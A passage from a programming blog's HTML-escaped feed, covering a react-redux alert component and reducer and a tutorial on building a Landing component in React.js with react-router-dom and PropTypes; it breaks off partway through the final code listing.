&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;PropTypes&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"prop-types"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;connect&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react-redux"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Alert&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;alerts&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt;
  &lt;span class="nx"&gt;alerts&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
  &lt;span class="nx"&gt;alerts&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
  &lt;span class="nx"&gt;alerts&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;map&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="sb"&gt;`alert alert-&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;alertType&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/div&amp;gt;&lt;/span&gt;
  &lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="nx"&gt;Alert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;propTypes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;alerts&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;PropTypes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;isRequired&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;

&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;mapStateToProps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;
  &lt;span class="nx"&gt;alerts&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;mapStateToProps&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="nx"&gt;Alert&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;To break it down, we've created a React component (class) &lt;code&gt;Alert&lt;/code&gt; which takes in &lt;code&gt;alerts&lt;/code&gt; as an array, verifies it isn't null or empty, and finally iterates over each element in the &lt;code&gt;alerts&lt;/code&gt; array to return a &lt;code&gt;div&lt;/code&gt; stylized with the appropriate information.&lt;/p&gt;
&lt;h2 id="reducer"&gt;Reducer&lt;/h2&gt;
&lt;p&gt;Lastly we have the reducer which we want to handle all the states that can be created by the &lt;code&gt;alert&lt;/code&gt; action. Luckily we can do this with a switch statement:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;SET_ALERT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;REMOVE_ALERT&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"../actions/types.jsx"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;initialState&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;

&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;state&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;initialState&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;payload&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nx"&gt;SET_ALERT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[...&lt;/span&gt;&lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="nx"&gt;REMOVE_ALERT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;id&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;We define a function that takes in a state, and an action to act upon. We deconstruct the type and payload from the action to make things more readable. Now that we can switch across the different action types we do the following.&lt;/p&gt;
&lt;h3 id="set-alert-action"&gt;Set Alert Action&lt;/h3&gt;
&lt;p&gt;If a &lt;code&gt;SET_ALERT&lt;/code&gt; action is dispatched from our action we defined earlier, our reducer needs to update the relevant component which we also defined earlier. As such we return an array (which will become the alerts array) which contains the updated state of the application (using the spread operation to deconstruct the state object and concatenate it with the payload).&lt;/p&gt;
&lt;h3 id="remove-alert-action"&gt;Remove Alert Action&lt;/h3&gt;
&lt;p&gt;For this action type, we return a filtered array containing all the alerts except the id that was identified in the payload.&lt;/p&gt;
&lt;h3 id="default"&gt;Default&lt;/h3&gt;
&lt;p&gt;If neither setting or removing an alert, don't change the state at all.&lt;/p&gt;
&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Using &lt;code&gt;react-redux&lt;/code&gt; we can create a responsive web application which enhances the user experience!&lt;/p&gt;&lt;/body&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Components in React.js</title><link href="https://jackmckew.dev/components-in-reactjs.html" rel="alternate"></link><published>2020-09-18T00:00:00+10:00</published><updated>2020-09-18T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-18:/components-in-reactjs.html</id><summary type="html">&lt;body&gt;&lt;p&gt;To put it simply, components are the building blocks that make up the app in React.js. A component more specifically is a JavaScript class or function that optionally accepts inputs (aka properties or props) and returns a React element that describes how a section of the interface should appear â€¦&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;To put it simply, components are the building blocks that make up the app in React.js. A component more specifically is a JavaScript class or function that optionally accepts inputs (aka properties or props) and returns a React element that describes how a section of the interface should appear.&lt;/p&gt;
&lt;p&gt;In this post let's break down the general structure of a React component. More specifically this will also include using &lt;code&gt;react-redux&lt;/code&gt; for state management in the browser and &lt;code&gt;react-router-dom&lt;/code&gt; for handling dynamic routing. These can both be installed through &lt;code&gt;npm&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="React Logo" class="img-fluid" src="https://jackmckew.dev/img/react-logo.png"/&gt;&lt;/p&gt;
&lt;p&gt;Let's try to building a component which will represent a landing page on our React app with &lt;code&gt;create-react-app&lt;/code&gt;. We will also want to show a different page whether the user is logged in or not, so our &lt;code&gt;Landing&lt;/code&gt; component will take an input of (aka prop) of &lt;code&gt;isAuthenticated&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We won't be going into how the interface in App.s is created nor how isAuthenticated is handled outside the component in this post.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let's create a file &lt;code&gt;Landing.js&lt;/code&gt; (similarly could be named &lt;code&gt;Landing.jsx&lt;/code&gt; for react specific file extension, &lt;code&gt;Landing.ts&lt;/code&gt; for TypeScript or &lt;code&gt;Landing.tsx&lt;/code&gt; for both react specific extension with TypeScript). This is followed by by importing all the necessary requirements for our javascript file.&lt;/p&gt;
&lt;h2 id="import-requirements"&gt;Import Requirements&lt;/h2&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;Link&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Redirect&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react-router-dom"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;connect&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react-redux"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;PropTypes&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"prop-types"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;The first line is to import React library, while this isn't used explicitly in the remaining code we will write, it will not work without it. This is due to when the code is transpiled into JavaScript, it'll then used React directly with &lt;code&gt;React.createElement()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Next up is &lt;code&gt;Link&lt;/code&gt; and &lt;code&gt;Redirect&lt;/code&gt;, note the curly braces around these, this is known as destructuring, meaning we only want to take the two classes from the library. This method is useful for making more readable code when dealing with objects. &lt;code&gt;Link&lt;/code&gt; is &lt;code&gt;react-router-dom&lt;/code&gt;'s class for creating anchor tags (aka &lt;code&gt;&amp;lt;a/&amp;gt;&lt;/code&gt; in HTML), and similarly &lt;code&gt;Redirect&lt;/code&gt; is as you'd expect, a class to dynamically redirect to another route.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;connect&lt;/code&gt; is a function that connects a React component to a Redux store. Consider a redux store as the immutable (can't be changed after creation) state of the application. The only way to change the state of the store is to dispatch an action, which is typically handled by a reducer.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PropTypes&lt;/code&gt; is a way of implementing runtime type checking for React props. If TypeScript is used for the project, this is somewhat extra type checking, which we can never have enough of!&lt;/p&gt;
&lt;h2 id="the-component"&gt;The Component&lt;/h2&gt;
&lt;p&gt;Now that we've imported everything that we need, it's time to actually create the component! A component in React is a function, where the props are the inputs and the element to be rendered is the return statement. We do this with an arrow function (aka Lambda function) for clarity.&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Landing&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;isAuthenticated&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Redirect&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/user-profile"&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"homepage"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"site-title"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nx"&gt;An&lt;/span&gt; &lt;span class="nx"&gt;Awesome&lt;/span&gt; &lt;span class="nx"&gt;Landing&lt;/span&gt; &lt;span class="nx"&gt;Page&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/h1&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;div&lt;/span&gt; &lt;span class="nx"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"buttons"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Link&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/register"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nx"&gt;Sign&lt;/span&gt; &lt;span class="nx"&gt;Up&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/Link&amp;gt;&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Link&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/login"&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nx"&gt;Log&lt;/span&gt; &lt;span class="nx"&gt;In&lt;/span&gt;
                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/Link&amp;gt;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/div&amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/div&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;Landing&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;propTypes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;PropTypes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;code&gt;const&lt;/code&gt; signifies our function is immutable, in that it can't be changed after it's been created. Next we deconstruct the argument of &lt;code&gt;isAuthenticated&lt;/code&gt; from the function argument as we are expecting the function to be called with an object. If the user is logged in, then redirect them to their profile and if not, return a HTML &lt;code&gt;div&lt;/code&gt; which contains all the elements as required. Note that &lt;code&gt;className&lt;/code&gt; is used over &lt;code&gt;class&lt;/code&gt; to denote CSS mark up as in JavaScript &lt;code&gt;class&lt;/code&gt; is a keyword which can lead to unwanted behaviour.&lt;/p&gt;
&lt;p&gt;Following this we add an object to our function which denotes the types of the arguments which should be expected in the function call. If we wanted to ensure that &lt;code&gt;isAuthenticated&lt;/code&gt; is always passed, this is done by using the &lt;code&gt;isRequired&lt;/code&gt; property, resulting in: &lt;code&gt;isAuthenticated: PropTypes.bool.isRequired&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id="prop-types-connect"&gt;Prop Types &amp;amp; Connect&lt;/h2&gt;
&lt;p&gt;Lastly we must define how our component is to interact with the redux store and export the function such that it can be used in other files. Since the component is dependant on what the state of the application is, we need to create a function which will map the state to the relevant prop, which we aptly name &lt;code&gt;mapStateToProps&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This post is not intended to go through how to set up the redux store or interactions with it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;mapStateToProps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt;
    &lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;state&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;auth&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="nx"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;mapStateToProps&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="nx"&gt;Landing&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;code&gt;mapStateToProps&lt;/code&gt; is a function that takes in the current state of the application, and deconstructs the relevant element to use. &lt;code&gt;connect&lt;/code&gt; is a wrapper function (aka curried function), so when it's called with &lt;code&gt;connect(mapStateToProps)&lt;/code&gt; it returns another function which we can then use to pass our component into.&lt;/p&gt;
&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Now we can use the statement &lt;code&gt;import Landing from './Landing'&lt;/code&gt; and use our component similar to that of &lt;code&gt;Link&lt;/code&gt; in our app!&lt;/p&gt;
&lt;p&gt;The full source of &lt;code&gt;Landing.js&lt;/code&gt; is:&lt;/p&gt;
&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;Link&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Redirect&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react-router-dom"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;connect&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react-redux"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;PropTypes&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"prop-types"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;Landing&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;isAuthenticated&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;isAuthenticated&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;Redirect&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"/user-profile"&lt;/span&gt; &lt;span class="o"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
